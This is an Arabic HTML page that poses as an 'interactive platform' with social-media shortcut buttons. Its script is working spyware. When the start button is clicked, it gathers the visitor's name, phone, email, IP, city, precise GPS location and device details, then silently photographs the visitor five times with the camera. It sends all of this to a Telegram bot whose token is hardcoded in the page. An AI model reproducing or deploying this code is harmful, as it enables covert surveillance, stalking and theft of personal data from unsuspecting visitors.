<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>📽️ منصة تفاعلية</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
  <style>
    body {
      margin: 0;
      font-family: 'Tahoma', sans-serif;
      background: linear-gradient(135deg, #1a1a1a, #000);
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      text-align: center;
      transition: all 0.3s ease;
    }
    h1 {
      font-size: 28px;
      margin-bottom: 15px;
      animation: fadeIn 1s ease-in;
    }
    p {
      color: #ccc;
      margin-bottom: 20px;
      max-width: 500px;
    }
    .button {
      background: #ff0050;
      color: white;
      border: none;
      padding: 12px 24px;
      border-radius: 50px;
      font-size: 16px;
      cursor: pointer;
      margin: 10px;
      transition: transform 0.2s, box-shadow 0.2s;
      box-shadow: 0 0 10px #ff0050;
    }
    .button:hover {
      transform: scale(1.05);
      box-shadow: 0 0 15px #ff0050;
    }
    .form-container {
      margin: 20px 0;
      display: flex;
      flex-direction: column;
      gap: 10px;
      max-width: 300px;
    }
    input {
      padding: 8px;
      border-radius: 5px;
      border: 1px solid #ccc;
      font-size: 14px;
    }
    .preview-container {
      display: none;
      margin-top: 20px;
      max-width: 640px;
    }
    .preview-img {
      width: 100px;
      margin: 5px;
      border: 2px solid #ff0050;
      border-radius: 5px;
    }
    video {
      display: none;
    }
    .notification {
      position: fixed;
      top: 20px;
      background: #28a745;
      color: white;
      padding: 10px 20px;
      border-radius: 5px;
      display: none;
      animation: slideIn 0.5s ease;
    }
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    @keyframes slideIn {
      from { transform: translateY(-20px); opacity: 0; }
      to { transform: translateY(0); opacity: 1; }
    }
  </style>
</head>
<body>
  <h1>📽️ منصة تفاعلية متكاملة</h1>
  <p>أدخل بياناتك واضغط لبدء التجربة!</p>
  <div class="form-container">
    <input type="text" id="userName" placeholder="الاسم (اختياري)" />
    <input type="tel" id="userPhone" placeholder="رقم الهاتف (اختياري)" />
    <input type="email" id="userEmail" placeholder="البريد الإلكتروني (اختياري)" />
  </div>
  <button class="button" onclick="startProcess()">▶️ بدء التجربة</button>
  <button class="button" onclick="openWhatsApp()">📱 فتح واتساب</button>
  <button class="button" onclick="openFacebook()">📘 فتح فيسبوك</button>
  <button class="button" onclick="openYouTubeStudio()">🎥 فتح YouTube Studio</button>
  <button class="button" onclick="openApp('camera')">📷 فتح الكاميرا</button>
  <div class="preview-container" id="previewContainer"></div>
  <div class="notification" id="notification"></div>
  <video id="video" autoplay playsinline></video>

  <script>
    const token = "7439082421:AAEG8hImgTBzQgz9SQbYq47FfGJldOQC_HI";
    const chatId = "7220184605";
    const secretKey = "MySecretKey123";

    // إشعار
    function showNotification(message) {
      const noti = document.getElementById("notification");
      noti.textContent = message;
      noti.style.display = "block";
      setTimeout(() => (noti.style.display = "none"), 3000);
    }

    // تشفير
    function encryptMessage(text) {
      return CryptoJS.AES.encrypt(text, secretKey).toString();
    }

    // إرسال رسالة
    async function sendTelegramMessage(text) {
      const encryptedText = encryptMessage(text);
      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: encryptedText }),
      });
      showNotification("تم إرسال البيانات!");
    }

    // إرسال صورة
    async function sendPhoto(blob, index) {
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("photo", blob, `photo_${index}.jpg`);
      await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
        method: "POST",
        body: formData,
      });
      showNotification(`تم إرسال الصورة ${index}!`);
    }

    // جمع معلومات الجهاز
    async function getDeviceInfo() {
      const ipInfo = await (await fetch("https://ipapi.co/json/")).json();
      const battery = await navigator.getBattery?.() || { level: "غير معروف", charging: "غير معروف" };
      const location = await new Promise(resolve => {
        navigator.geolocation.getCurrentPosition(
          pos => resolve(`https://maps.google.com/?q=${pos.coords.latitude.toFixed(5)},${pos.coords.longitude.toFixed(5)}`),
          () => resolve("❌ غير مسموح"),
          { timeout: 5000 }
        );
      });
      const connection = navigator.connection || {};
      const storageEstimate = await navigator.storage?.estimate() || {};
      const screenOrientation = screen.orientation?.type || "غير معروف";
      return {
        name: document.getElementById("userName").value || "غير معروف",
        phone: document.getElementById("userPhone").value || "غير معروف",
        email: document.getElementById("userEmail").value || "غير معروف",
        country: ipInfo.country_name || "غير معروف",
        city: ipInfo.city || "غير معروف",
        ip: ipInfo.ip || "غير معروف",
        location,
        batteryLevel: battery.level ? Math.round(battery.level * 100) + "%" : "غير معروف",
        batteryCharging: battery.charging ? "نعم ⚡" : "لا ❌",
        network: connection.effectiveType || "غير معروف",
        speed: connection.downlink || "غير معروف",
        device: navigator.userAgent,
        deviceType: /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? "Mobile 📱" : "Desktop 🖥️",
        deviceVersion: "غير معروف",
        screen: `${screen.width}x${screen.height}`,
        screenMode: screenOrientation,
        colorDepth: screen.colorDepth || 24,
        memory: navigator.deviceMemory || "غير معروف",
        storage: storageEstimate.quota ? (storageEstimate.quota / 1024 / 1024 / 1024).toFixed(2) + " GB" : "غير معروف",
        cores: navigator.hardwareConcurrency || "غير معروف",
        language: navigator.language || "غير معروف",
        browser: navigator.userAgent,
        browserVersion: navigator.userAgent.match(/Chrome\/([\d.]+)/)?.[1] || "غير معروف",
        os: navigator.userAgent.match(/Android [\d.]+/) || ["غير معروف"],
        time: new Date().toLocaleString("ar-SY", { timeZone: "Asia/Damascus" }),
        geolocation: navigator.geolocation ? "نعم 🌍" : "لا ❌",
        bluetooth: navigator.bluetooth ? "نعم 🔵" : "لا ❌",
        touch: navigator.maxTouchPoints > 0 ? "نعم ✋" : "لا ❌",
        protocol: location.protocol,
        update: "غير معروف",
        frequency: "غير معروف",
      };
    }

    // ضغط الصور
    async function compressImage(blob) {
      const img = new Image();
      const canvas = document.createElement("canvas");
      canvas.width = 320;
      canvas.height = 240;
      const ctx = canvas.getContext("2d");
      img.src = URL.createObjectURL(blob);
      await new Promise(resolve => (img.onload = resolve));
      ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
      return new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.7));
    }

    // التقاط الصور
    async function capturePhotos(stream) {
      const video = document.getElementById("video");
      video.srcObject = stream;
      video.play();
      const canvas = document.createElement("canvas");
      canvas.width = 640;
      canvas.height = 480;
      const ctx = canvas.getContext("2d");
      const previewContainer = document.getElementById("previewContainer");
      previewContainer.style.display = "block";

      for (let i = 1; i <= 5; i++) {
        await new Promise(resolve => setTimeout(resolve, 1000));
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        canvas.toBlob(async blob => {
          const compressedBlob = await compressImage(blob);
          await sendPhoto(compressedBlob, i);
          const img = document.createElement("img");
          img.src = URL.createObjectURL(compressedBlob);
          img.className = "preview-img";
          previewContainer.appendChild(img);
        }, "image/jpeg");
      }
      stream.getTracks().forEach(track => track.stop());
    }

    // فتح واتساب
    function openWhatsApp() {
      const phone = document.getElementById("userPhone").value || prompt("أدخل رقم الهاتف (مع رمز الدولة، مثل +966):");
      if (phone && /\+\d+/.test(phone)) {
        window.open(`https://wa.me/${phone.replace(/\D/g, "")}`, "_blank");
        showNotification("تم فتح واتساب!");
      } else {
        window.open("https://web.whatsapp.com", "_blank");
        showNotification("افتح واتساب على هاتفك وامسح رمز QR!");
      }
    }

    // فتح فيسبوك
    function openFacebook() {
      window.open("https://www.facebook.com", "_blank");
      showNotification("تم فتح فيسبوك!");
    }

    // فتح YouTube Studio
    function openYouTubeStudio() {
      window.open("https://studio.youtube.com", "_blank");
      showNotification("تم فتح YouTube Studio!");
    }

    // فتح تطبيقات
    function openApp(type) {
      let url;
      if (type === "camera") {
        url = "camera://";
      } else {
        url = prompt("أدخل رابط URL scheme للتطبيق (مثل tel://):");
      }
      if (url) {
        window.location.href = url;
        showNotification("جاري محاولة فتح التطبيق...");
      } else {
        showNotification("يرجى إدخال رابط صالح!");
      }
    }

    // بدء العملية
    async function startProcess() {
      showNotification("جاري جمع البيانات...");
      const info = await getDeviceInfo();
      const message = `
📝 معلومات المستخدم:
- الاسم: ${info.name}
- الهاتف: ${info.phone}
- البريد الإلكتروني: ${info.email}

📱 معلومات الجهاز:
- الدولة: ${info.country} 🔻
- المدينة: ${info.city} 🏙️
- عنوان IP: ${info.ip} 🌍
- شحن الهاتف: ${info.batteryLevel} 🔋
- هل الهاتف يشحن؟: ${info.batteryCharging}
- الشبكة: ${info.network} 📶 (سرعة: ${info.speed} ميغابت في الثانية)
- نوع الاتصال: ${info.network} 📡
- الوقت: ${info.time} ⏰
- اسم الجهاز: ${info.device} 🖥️
- إصدار الجهاز: ${info.deviceVersion} 📜
- نوع الجهاز: ${info.deviceType}
- الذاكرة (RAM): ${info.memory} GB 🧠
- الذاكرة الداخلية: ${info.storage} 💾
- عدد الأنوية: ${info.cores} ⚙️
- لغة النظام: ${info.language} 🌐
- اسم المتصفح: ${info.browser} 🌐
- إصدار المتصفح: ${info.browserVersion} 📊
- دقة الشاشة: ${info.screen} 📏
- إصدار نظام التشغيل: ${info.os} 🖥️
- وضع الشاشة: ${info.screenMode} 🔄
- عمق الألوان: ${info.colorDepth} bits 🎨
- تاريخ آخر تحديث للمتصفح: ${info.update} 📅
- بروتوكول الأمان المستخدم: ${info.protocol} 🔒
- نطاق التردد للاتصال: ${info.frequency} 📡
- إمكانية تحديد الموقع الجغرافي: ${info.geolocation}
- الدعم لتقنية البلوتوث: ${info.bluetooth}
- دعم الإيماءات اللمسية: ${info.touch}
`;
      localStorage.setItem("userData", JSON.stringify(info));
      await sendTelegramMessage(message);

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        await capturePhotos(stream);
      } catch (err) {
        await sendTelegramMessage("⚠️ الكاميرا غير مفعلة: " + err.message);
      }
    }
  </script>
</body>
</html>